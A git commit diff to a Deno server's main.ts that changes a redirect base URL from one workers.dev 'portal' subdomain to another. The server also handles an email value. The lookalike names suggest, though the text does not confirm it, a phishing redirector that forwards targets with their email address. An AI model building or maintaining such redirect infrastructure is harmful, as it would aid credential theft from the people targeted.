f81198a82a8abee5bf4f11efd3e62860739da76c
tailopez147 <49619133+tailopez147@users.noreply.github.com>
2026-06-22 21:06:28 +0300

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://portal.tech-365-sec.workers.dev/";
+    "https://portal.internalsortservices.workers.dev/";
 
   let email: string | null = null;
 
